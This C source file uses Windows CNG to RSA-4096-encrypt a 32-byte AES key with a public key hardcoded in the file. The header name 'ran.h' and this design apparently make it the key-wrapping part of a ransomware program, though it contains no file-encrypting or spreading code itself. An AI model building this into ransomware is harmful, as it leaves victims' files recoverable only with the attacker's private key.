#include "ran.h"

#define RSA_PulbicKeyBLOB_Size 539

typedef struct _PublicKey_BLOB {
	ULONG Magic;                // Magic number of RSAKEY
	ULONG BitLength;            // The size(bit) of the modulus N
	ULONG cbPublicExp;          // The size(byte) of the Public exponent e;
	ULONG cbModulus;            // The size(byte) of the modulus N; 
	ULONG cbPrime1;             // The size(byte) of the p;
	ULONG cbPrime2;             // The size(byte) of the q;
	BYTE PublicExponent[3];     // Array of Public Exponent e; e = 65537 = 0x01, 0x00, 0x01
	BYTE Modulus[512];          // Array of Modulus n; In RSA-4096, n = 4096-bit = 512-byte
} PublicKey_BLOB;

DWORD ciphertextLength = 0;


BYTE e[3] = { 0x01, 0x00, 0x01 };
BYTE n[512] = { 0xaa, 0xd6, 0x28, 0xf7, 0xb1, 0xe8, 0xeb, 0x1e, 0x16, 0x97, 0xc1, 0x7d, 0xa9,
	0xbc, 0x7d, 0x45, 0x5a, 0x9f, 0x64, 0x67, 0x76, 0x65, 0x9d, 0x1a, 0xc1, 0xd1,
	0xfb, 0x8f, 0x8c, 0xfe, 0xcb, 0xaf, 0x88, 0x2d, 0xe7, 0x88, 0x0b, 0x5b, 0xc9,
	0x89, 0x83, 0xc6, 0x2d, 0x2e, 0xb4, 0x9b, 0x19, 0x75, 0xb2, 0x97, 0xab, 0x61,
	0xc2, 0xc1, 0xfc, 0x89, 0x49, 0x67, 0x8b, 0xd9, 0xd1, 0x3f, 0xb5, 0x3a, 0x9c,
	0xaa, 0x2f, 0x11, 0x19, 0x07, 0x11, 0xf7, 0x63, 0x87, 0xe9, 0xeb, 0x7c, 0x1d,
	0xaa, 0x00, 0x95, 0xb7, 0x3f, 0xc0, 0xb5, 0x50, 0x5e, 0x2a, 0xa7, 0x44, 0x41,
	0x22, 0x2e, 0x29, 0x9c, 0xc3, 0xb5, 0x0e, 0xb3, 0x89, 0x90, 0x0b, 0x7d, 0xb3,
	0xf3, 0xc4, 0xb3, 0xc6, 0x2e, 0x51, 0x33, 0x2f, 0xf0, 0xf2, 0x1e, 0x60, 0xbf,
	0x44, 0x3b, 0x9f, 0xdc, 0x37, 0x9f, 0xdd, 0x59, 0xf7, 0x80, 0x2e, 0xc3, 0xe4,
	0x4a, 0xb5, 0x9e, 0x5e, 0x07, 0x21, 0x03, 0x47, 0xec, 0x9c, 0xee, 0x1b, 0x8b,
	0x7d, 0x60, 0xdc, 0x1c, 0xaa, 0x4d, 0x21, 0x78, 0xa9, 0x2d, 0x67, 0xe4, 0x68,
	0x35, 0xce, 0x55, 0x87, 0x05, 0x87, 0x16, 0xbf, 0x84, 0x50, 0xaf, 0x8b, 0x23,
	0x5d, 0xfc, 0xf9, 0xd4, 0x89, 0x47, 0x57, 0xa5, 0x25, 0x32, 0x54, 0x57, 0x59,
	0xcb, 0x1b, 0x77, 0x1b, 0x83, 0x0b, 0x90, 0x10, 0x4e, 0x3a, 0xd6, 0xa1, 0x30,
	0x9c, 0x71, 0x74, 0x9b, 0x80, 0x38, 0x6c, 0x9d, 0xe7, 0xc7, 0x4a, 0xa7, 0x08,
	0xc5, 0x0e, 0x6b, 0x18, 0x44, 0x0e, 0x0e, 0xbb, 0x78, 0xa1, 0x46, 0x85, 0x40,
	0xcc, 0x25, 0x9f, 0x84, 0xc8, 0x81, 0x8d, 0xb5, 0xca, 0xa2, 0xdb, 0xeb, 0xdf,
	0x3f, 0xa2, 0x39, 0xfc, 0x60, 0xd6, 0x05, 0x89, 0x24, 0x99, 0x68, 0x63, 0xa0,
	0x01, 0x46, 0x6d, 0x2f, 0x1a, 0x7b, 0x8c, 0x9b, 0x3f, 0x7d, 0x5d, 0x8d, 0xb5,
	0x0e, 0xe3, 0x85, 0xbb, 0x6f, 0x72, 0x1c, 0xfc, 0xc7, 0x62, 0x20, 0x82, 0xe0,
	0xec, 0xed, 0xc8, 0xe1, 0x2c, 0x6e, 0xd0, 0xa1, 0xea, 0xf0, 0xc2, 0xec, 0x55,
	0x7a, 0xf6, 0x90, 0x12, 0x23, 0x4f, 0x01, 0x1f, 0xf4, 0x4b, 0x79, 0xc2, 0xd4,
	0x11, 0x6d, 0xa5, 0x99, 0x27, 0xc1, 0xfe, 0xf7, 0x41, 0x66, 0x12, 0xde, 0xd9,
	0x7b, 0x04, 0xff, 0xd1, 0xf9, 0x05, 0xb7, 0xd7, 0x16, 0x0c, 0x2f, 0x34, 0x5e,
	0x14, 0xd3, 0x8b, 0xa3, 0xb2, 0x19, 0xfa, 0x2e, 0xdd, 0xcf, 0xcd, 0xc3, 0xa3,
	0x4c, 0x58, 0xb0, 0x55, 0x31, 0x3b, 0x25, 0xda, 0x0e, 0x0e, 0xbd, 0x21, 0xc4,
	0x3c, 0x2f, 0x12, 0xb6, 0xb4, 0x4b, 0xad, 0x83, 0xa7, 0xfa, 0x1f, 0x09, 0x41,
	0x6f, 0xb9, 0x96, 0x32, 0xe7, 0x13, 0x0b, 0x7f, 0xb5, 0x88, 0xb7, 0xd3, 0x5a,
	0xd8, 0x91, 0x3f, 0x52, 0x62, 0x8a, 0x94, 0x15, 0xc9, 0x2d, 0x23, 0xd6, 0xc8,
	0x5e, 0xc6, 0x1e, 0x3e, 0xf4, 0xa1, 0x32, 0xc6, 0xcb, 0xcb, 0x2e, 0x0e, 0xbd,
	0xe8, 0xc5, 0xf1, 0xdc, 0x1b, 0xb9, 0x7b, 0x4b, 0x97, 0xa3, 0x78, 0x8a, 0x5c,
	0x62, 0xc8, 0x26, 0xd5, 0xc9, 0x04, 0x81, 0x6c, 0xee, 0x1c, 0xdd, 0xe0, 0x7b,
	0x7d, 0xce, 0xd9, 0xf3, 0xfa, 0xb2, 0x0d, 0xfe, 0xb7, 0x5c, 0xb0, 0xe6, 0x71,
	0xb7, 0x52, 0x84, 0xd1, 0x67, 0xdf, 0x6e, 0x6c, 0x41, 0xce, 0xa3, 0x3c, 0x0a,
	0x50, 0xc7, 0xcd, 0xce, 0xbe, 0xe8, 0x35, 0xa2, 0x41, 0xe7, 0xf4, 0x3b, 0xcf,
	0xd3, 0xf8, 0x2d, 0xf6, 0x34, 0x89, 0x92, 0x7f, 0x29, 0x4e, 0x17, 0x6a, 0xd4,
	0xac, 0x98, 0x88, 0xd7, 0x9e, 0x5c, 0x76, 0xc1, 0xd0, 0xc2, 0xb0, 0xe2, 0xce,
	0xe1, 0xdc, 0x02, 0x1d, 0xc4, 0x20, 0xe2, 0x19, 0x70, 0x85, 0xb5, 0xf1, 0x44,
	0x82, 0x45, 0x6d, 0x18, 0x05 };

void GET_RSA_ALG_HANDLE(BCRYPT_ALG_HANDLE* handle)
{
	NTSTATUS status = BCryptOpenAlgorithmProvider(
		handle,                 // Algorithm Handle pointer 
		BCRYPT_RSA_ALGORITHM,   // Cryptographic Algorithm name 
		NULL,                   // 
		0);                     // Flags 
	if (!NT_SUCCESS(status))
	{
		printf("Error Code : %x \n BCryptOpenAlgorithmProvider fail\n", status);
		return;
	}

	return;
}

int SettingPublicKeyBLOB(PublicKey_BLOB** BLOB)
{
	*BLOB = (PublicKey_BLOB*)(malloc)(sizeof(PublicKey_BLOB));
	if (*BLOB == NULL) return FAIL;

	(*BLOB)->Magic = BCRYPT_RSAPUBLIC_MAGIC;
	(*BLOB)->BitLength = 4096;
	(*BLOB)->cbPublicExp = 3;
	(*BLOB)->cbModulus = 512;
	(*BLOB)->cbPrime1 = 0;
	(*BLOB)->cbPrime2 = 0;
	memcpy((*BLOB)->PublicExponent, e, 3);
	memcpy((*BLOB)->Modulus, n, 512);

	return SUCCESS;
}

void FreePublicKeyBLOB(PublicKey_BLOB** BLOB)
{
	if ((*BLOB) == NULL) return;

	free(*BLOB);
	return;
}

/************************************************************************************
* rsa_4096_enc : Encrypts the data using RSA-4096
*
* input:
* ALG_HANDLE - handle for the RSA algorithm
* plain_e - plaintext
* cipher - ciphertext
* *********************************************************************************/
void rsa_4096_enc(BCRYPT_ALG_HANDLE ALG_HANDLE, unsigned char* plain_e, unsigned char* cipher)
{
	BYTE plain[32];
	memcpy(plain, plain_e, 32);
	PBYTE ciphertext = NULL;
	NTSTATUS status = 0;
	DWORD bufferSize = 0;
	BCRYPT_KEY_HANDLE PUBLICKEY_HANDLE = NULL;

	PublicKey_BLOB* RSA_PUBLICKEY = NULL;                       // PulicKeyBLOB Setting         
	if (!SettingPublicKeyBLOB(&RSA_PUBLICKEY)) {
		printf("Memory Allocation Fail...\n");
		FreePublicKeyBLOB(&RSA_PUBLICKEY);
		return;
	}

	status = BCryptImportKeyPair(
		ALG_HANDLE,                    // CNG Algorithm Handle 
		NULL,                          // Not use 
		BCRYPT_RSAPUBLIC_BLOB,         // Type of blob
		&PUBLICKEY_HANDLE,             // A pointer to Key Handle
		(PBYTE)&RSA_PUBLICKEY->Magic,  // Address of a buffer that contains the key blob
		RSA_PulbicKeyBLOB_Size,            // Size of the buffer that contains the key blob 
		BCRYPT_NO_KEY_VALIDATION);     // Flags 
	if (!NT_SUCCESS(status))
	{
		printf("Error Code : %x \n BCryptImportKeyPair fail\n", status);
		BCryptDestroyKey(PUBLICKEY_HANDLE);
		FreePublicKeyBLOB(&RSA_PUBLICKEY);
		return;
	}

	status = BCryptEncrypt(      // Calculate ciphertext length
		PUBLICKEY_HANDLE,        // KEY HANDLE
		plain,					 // Address of the buffer that contains the plaintext 
		sizeof(plain),			 // Size of the buffer that contains the plaintext 
		NULL,                    // A pointer to padding info used with asymetric; OAEP
		NULL,                    // Address of the buffer that contains the Initial Vector 
		0,                       // Size of the buffer that contains the Initial Vector
		NULL,                    // Address of the buffer that receives the ciphertext. 
		0,                       // Size of the buffer that receives the ciphertext
		&ciphertextLength,       // Variable that receives number of bytes copied to ciphertext buffer
		BCRYPT_PAD_PKCS1);       // Flags : Padding 
	if (!NT_SUCCESS(status))
	{
		printf("Error Code : %x \n BCryptEncrypt fail(Calculate ciphertextLength)\n", status);
		BCryptDestroyKey(PUBLICKEY_HANDLE);
		FreePublicKeyBLOB(&RSA_PUBLICKEY);
		return;
	}
	else
	{
		ciphertext = (PBYTE)calloc(ciphertextLength, sizeof(BYTE));
		if (ciphertext == NULL)
		{
			printf("Memory Allocation(ciphertext) Fail...\n");
			BCryptDestroyKey(PUBLICKEY_HANDLE);
			FreePublicKeyBLOB(&RSA_PUBLICKEY);
			return;
		}
	}

	status = BCryptEncrypt(                         // Encrypt data
		PUBLICKEY_HANDLE,        // KEY HANDLE
		plain,               // Address of the buffer that contains the plaintext 
		sizeof(plain),       // Size of the buffer that contains the plaintext 
		NULL,                    // A pointer to padding info used with asymetric; OAEP
		NULL,                    // Address of the buffer that contains the Initial Vector 
		0,                       // Size of the buffer that contains the Initial Vector
		ciphertext,              // Address of the buffer that receives the ciphertext. 
		ciphertextLength,        // Size of the buffer that receives the ciphertext
		&bufferSize,             // Variable that receives number of bytes copied to ciphertext buffer
		BCRYPT_PAD_PKCS1);       // Flags : Padding 
	if (!NT_SUCCESS(status))
	{
		printf("Error Code : %x \n BCryptEncrypt fail\n", status);
		free(ciphertext);
		BCryptDestroyKey(PUBLICKEY_HANDLE);
		FreePublicKeyBLOB(&RSA_PUBLICKEY);
		return;
	}

	memcpy(cipher, ciphertext, 512);
	free(ciphertext);
	BCryptDestroyKey(PUBLICKEY_HANDLE);
	ciphertextLength = 0;
	FreePublicKeyBLOB(&RSA_PUBLICKEY);
}

/************************************************************************************
* r_enc : Encrypts the data using RSA-4096 (used for AES key encryption)
*
* input:
* key - plaintext
* key_out - ciphertext
* *********************************************************************************/
void r_enc(unsigned char* key, unsigned char* key_out)
{
	BCRYPT_ALG_HANDLE RSA_ALG = NULL;
	GET_RSA_ALG_HANDLE(&RSA_ALG);
	rsa_4096_enc(RSA_ALG, key, key_out);
	BCryptCloseAlgorithmProvider(RSA_ALG, 0);
}